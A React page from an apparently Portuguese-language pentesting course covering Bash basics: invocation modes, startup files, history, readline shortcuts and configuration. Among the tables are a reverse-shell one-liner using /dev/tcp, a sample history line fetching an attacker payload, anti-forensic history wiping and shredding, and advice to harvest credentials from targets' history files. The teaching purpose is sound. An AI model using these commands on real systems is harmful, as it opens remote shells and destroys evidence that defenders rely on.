import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function ShellBash() {
  return (
    <PageContainer
      title="Shell Bash — visão geral"
      subtitle="Tipos de invocação, arquivos de inicialização, history e atalhos que todo pentester usa o dia inteiro."
      difficulty="iniciante"
      timeToRead="14 min"
    >
      <h2>O que é o Bash</h2>
      <p>
        <strong>Bash</strong> (Bourne Again SHell) é o interpretador padrão da maioria das
        distros Linux. No Kali atual, o shell padrão de novos usuários é o <strong>Zsh</strong>,
        mas o Bash continua presente, é o shell de quase todo target Linux que você vai
        comprometer e é o que aparece na maioria dos <em>reverse shells</em>. Dominar Bash
        não é opcional para quem faz pentest.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "echo $SHELL",
            out: "/usr/bin/zsh",
            outType: "info",
          },
          {
            comment: "shell efetivo do processo atual (não a env var)",
            cmd: "ps -p $$ -o comm=",
            out: "zsh",
            outType: "info",
          },
          {
            cmd: "bash --version",
            out: `GNU bash, versão 5.2.32(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2022 Free Software Foundation, Inc.
Licença GPLv3+: GNU GPL versão 3 ou superior <http://gnu.org/licenses/gpl.html>`,
            outType: "default",
          },
          {
            cmd: "which bash; type bash",
            out: `/usr/bin/bash
bash é hashed (/usr/bin/bash)`,
            outType: "muted",
          },
        ]}
      />

      <h2>Tipos de invocação</h2>
      <p>
        Bash se comporta diferente dependendo de COMO foi invocado. Isso afeta QUAIS
        arquivos de configuração ele lê, e impacta diretamente seu workflow (ex: variáveis
        que somem, PATH que muda quando você abre um terminal vs roda um cron).
      </p>

      <CommandTable
        title="Tipos de shell Bash"
        variations={[
          { cmd: "interactive login", desc: "Você loga (TTY, SSH). Lê /etc/profile + ~/.bash_profile (ou ~/.profile).", output: "ssh user@host  →  shell de login interativo" },
          { cmd: "interactive non-login", desc: "Abriu um novo terminal dentro de uma sessão gráfica. Lê ~/.bashrc.", output: "Ctrl+Alt+T no Xfce → bash não-login" },
          { cmd: "non-interactive", desc: "Script (bash script.sh) ou comando remoto. NÃO lê .bashrc por padrão.", output: "ssh user@host 'echo oi' → não-interativo" },
          { cmd: "bash -l", desc: "Força modo login (mesmo dentro de outro shell).", output: "Útil para reproduzir env de cron/systemd." },
          { cmd: "bash -i", desc: "Força modo interativo (lê .bashrc).", output: "bash -i >& /dev/tcp/IP/PORT 0>&1   ←  reverse shell clássico" },
          { cmd: "bash --rcfile arquivo", desc: "Usa um rcfile alternativo.", output: "Útil para testar config sem mexer no ~/.bashrc real." },
          { cmd: "bash --noprofile --norc", desc: "Bash limpo, sem ler nenhum dotfile.", output: "Reproduz comportamento de scripts e ambientes 'enxutos'." },
        ]}
      />

      <h2>Arquivos de inicialização</h2>
      <p>
        A confusão clássica: por que <code>export FOO=bar</code> no <code>~/.bashrc</code>
        funciona no terminal mas não aparece num cron job? Porque o cron roda shell
        <strong> não-interativo</strong>, que lê outros arquivos. Mapa mental abaixo.
      </p>

      <CodeBlock
        language="bash"
        title="ordem de leitura — login interativo"
        code={`# 1. /etc/profile           (sistema)
#    └─> /etc/profile.d/*.sh
# 2. ~/.bash_profile         (se existir)
#    └─> tipicamente faz: [ -f ~/.bashrc ] && . ~/.bashrc
# 3. ~/.bash_login           (se .bash_profile não existir)
# 4. ~/.profile              (se nenhum dos dois acima existir)
#
# Logout:
# 5. ~/.bash_logout`}
      />

      <CodeBlock
        language="bash"
        title="ordem de leitura — não-login interativo (terminal novo)"
        code={`# 1. /etc/bash.bashrc
# 2. ~/.bashrc
#
# (NUNCA lê /etc/profile nem ~/.bash_profile)`}
      />

      <AlertBox type="warning" title="Pegadinha do PATH">
        Se você define <code>PATH</code> no <code>~/.bashrc</code>, ele NÃO aparece em
        sessões SSH não-interativas (ex: <code>ssh user@host '/usr/local/bin/tool'</code>
        não acha o tool). A solução portável é exportar em <code>~/.profile</code> ou
        <code> ~/.bash_profile</code> e source-ar o <code>.bashrc</code> de dentro dele.
      </AlertBox>

      <Terminal
        path="~"
        lines={[
          {
            comment: "ver TUDO que está sendo lido durante o login",
            cmd: "bash -lxc exit 2>&1 | head -20",
            out: `+ . /etc/profile
++ test -d /etc/profile.d
++ for i in /etc/profile.d/*.sh
++ . /etc/profile.d/bash_completion.sh
++ . /etc/profile.d/locale.sh
+ . /home/wallyson/.bash_profile
++ test -f /home/wallyson/.bashrc
++ . /home/wallyson/.bashrc
+ exit`,
            outType: "info",
          },
        ]}
      />

      <h2>History</h2>
      <p>
        O Bash guarda os comandos que você digitou em <code>~/.bash_history</code>. Isso é
        ouro em pentest: um SSH como <em>root</em> num target velho frequentemente revela
        senhas digitadas em flag, IPs internos, etc. Saber manipular o history também é
        anti-forense básico (limpar rastros após pwn).
      </p>

      <CommandTable
        title="history"
        variations={[
          { cmd: "history", desc: "Lista todo o histórico em memória.", output: "  501  ls\n  502  cd /tmp\n  503  wget http://attacker/payload.sh" },
          { cmd: "history 20", desc: "Últimos 20 comandos.", output: "Útil para revisar o que acabou de fazer." },
          { cmd: "history -c", desc: "Limpa o histórico EM MEMÓRIA (não o arquivo).", output: "Comando 'history' fica vazio até você sair." },
          { cmd: "history -w", desc: "Escreve agora no ~/.bash_history.", output: "Por padrão só escreve no logout." },
          { cmd: "history -d 503", desc: "Apaga o item 503.", output: "Limpeza cirúrgica de uma linha específica." },
          { cmd: "unset HISTFILE", desc: "Desativa gravação do history nesta sessão.", output: "Truque clássico pré-pwn: nada será salvo ao sair." },
          { cmd: "export HISTFILE=/dev/null", desc: "Mesma ideia, mais explícita.", output: "Tudo que você digitar some no logout." },
          { cmd: "HISTSIZE=0", desc: "Não guarda nada em memória.", output: "Combine com HISTFILE=/dev/null para invisibilidade." },
          { cmd: "echo \" cmd_secreto\"", desc: "Espaço no início faz o Bash ignorar (se HISTCONTROL=ignorespace).", output: "Variável HISTCONTROL controla isso." },
          { cmd: "shred -u ~/.bash_history && ln -s /dev/null ~/.bash_history", desc: "Anti-forense duro: destrói e redireciona pra /dev/null.", output: "Próximo logout não escreve nada." },
        ]}
      />

      <h2>Bang history (atalhos com !)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "repete o último comando",
            cmd: "!!",
            out: `nmap -sV 10.10.10.5
Starting Nmap 7.95 ( https://nmap.org )...`,
            outType: "default",
          },
          {
            comment: "último comando, mas com sudo",
            cmd: "sudo !!",
            out: "sudo nmap -sV -O 10.10.10.5",
            outType: "info",
          },
          {
            comment: "último argumento do último comando (ouro!)",
            cmd: "ls !$",
            out: `ls 10.10.10.5
ls: não foi possível acessar '10.10.10.5': Não existe arquivo ou diretório`,
            outType: "warning",
          },
          {
            comment: "último comando que começa com 'nm'",
            cmd: "!nm",
            out: "nmap -sV 10.10.10.5",
            outType: "muted",
          },
          {
            comment: "número específico do history",
            cmd: "!503",
            out: "wget http://attacker/payload.sh",
            outType: "default",
          },
          {
            comment: "substituição rápida no último comando (s/IP_velho/IP_novo)",
            cmd: "^10.10.10.5^10.10.10.7",
            out: "nmap -sV 10.10.10.7",
            outType: "info",
          },
        ]}
      />

      <h2>Atalhos de edição (readline)</h2>
      <CommandTable
        title="navegação na linha de comando"
        variations={[
          { cmd: "Ctrl+A / Ctrl+E", desc: "Início / fim da linha.", output: "Mais rápido que Home/End." },
          { cmd: "Ctrl+W", desc: "Apaga a palavra anterior.", output: "Útil para reescrever um arg." },
          { cmd: "Ctrl+U / Ctrl+K", desc: "Apaga do cursor pra trás / pra frente.", output: "Limpa metade da linha." },
          { cmd: "Ctrl+Y", desc: "Cola o que foi cortado com Ctrl+W/U/K.", output: "'yank' do readline." },
          { cmd: "Ctrl+R", desc: "Busca reversa no history.", output: "(reverse-i-search): digite parte do comando" },
          { cmd: "Ctrl+L", desc: "Limpa a tela (= clear).", output: "Não apaga history." },
          { cmd: "Alt+.", desc: "Cola o ÚLTIMO argumento do comando anterior.", output: "= !$ mas sem precisar pressionar Enter pra ver." },
          { cmd: "Ctrl+X Ctrl+E", desc: "Abre o comando atual no $EDITOR (vim/nano).", output: "Para editar one-liner gigante." },
          { cmd: "Tab", desc: "Auto-completa.", output: "Tab tab → mostra todas as opções." },
        ]}
      />

      <h2>Modo de edição: emacs vs vi</h2>
      <p>
        Por padrão o readline usa atalhos estilo <strong>emacs</strong> (Ctrl+A, Ctrl+E,
        etc). Você pode trocar para <strong>vi mode</strong>, que dá os modos normal/insert
        do vim na própria linha de comando.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "set -o vi",
            out: "(silencioso — agora ESC entra em modo normal, i volta pra inserção)",
            outType: "muted",
          },
          {
            cmd: "set -o emacs",
            out: "(volta ao default)",
            outType: "muted",
          },
          {
            comment: "tornar permanente",
            cmd: "echo 'set -o vi' >> ~/.bashrc",
            out: "(silencioso)",
            outType: "muted",
          },
        ]}
      />

      <h2>Variáveis úteis para customizar</h2>
      <CodeBlock
        language="bash"
        title="snippet pra colar no ~/.bashrc"
        code={`# Não duplica entradas iguais e ignora as começadas com espaço
export HISTCONTROL=ignoreboth:erasedups
# 100 mil comandos em memória e em disco
export HISTSIZE=100000
export HISTFILESIZE=100000
# Timestamp em cada entrada do history (forense friendly)
export HISTTIMEFORMAT="%F %T  "
# Append em vez de truncar (preserva history de várias sessões)
shopt -s histappend
# Append depois de cada comando (não só no logout)
PROMPT_COMMAND="history -a; \${PROMPT_COMMAND:-}"
# Verifica tamanho da janela após cada comando
shopt -s checkwinsize
# Auto cd: digitar 'Documents' equivale a 'cd Documents'
shopt -s autocd
# Globs case-insensitive
shopt -s nocaseglob
# ** vira recursivo (igual zsh)
shopt -s globstar`}
      />

      <PracticeBox
        title="Faça seu Bash 'parar de esquecer' o history"
        goal="Configurar o history para 100k entradas, append em todas as sessões e timestamps."
        steps={[
          "Abra ~/.bashrc no seu editor.",
          "Cole o snippet acima ao final.",
          "Recarregue: source ~/.bashrc.",
          "Verifique abrindo dois terminais e rodando comandos diferentes — o history deve mesclar.",
        ]}
        command={`echo 'export HISTSIZE=100000
export HISTFILESIZE=100000
export HISTCONTROL=ignoreboth:erasedups
export HISTTIMEFORMAT="%F %T  "
shopt -s histappend
PROMPT_COMMAND="history -a; \${PROMPT_COMMAND:-}"' >> ~/.bashrc
source ~/.bashrc
history | tail -3`}
        expected={` 998  2026-04-03 15:20:11  ls
 999  2026-04-03 15:20:14  cd /tmp
1000  2026-04-03 15:20:18  history | tail -3`}
        verify="Cada linha do history deve ter data+hora. Abrindo um segundo terminal, history mostra os comandos do primeiro."
      />

      <AlertBox type="danger" title="Em pentest: cuidado com o history do TARGET">
        Antes de fazer qualquer coisa relevante num shell comprometido, considere
        <code> unset HISTFILE</code> ou <code>export HISTFILE=/dev/null</code> ANTES de
        digitar comandos sensíveis. Vasculhar <code>~/.bash_history</code> de outros
        usuários (incluindo root) é uma das primeiras coisas a fazer no
        post-exploitation — credenciais e IPs internos vivem ali.
      </AlertBox>
    </PageContainer>
  );
}
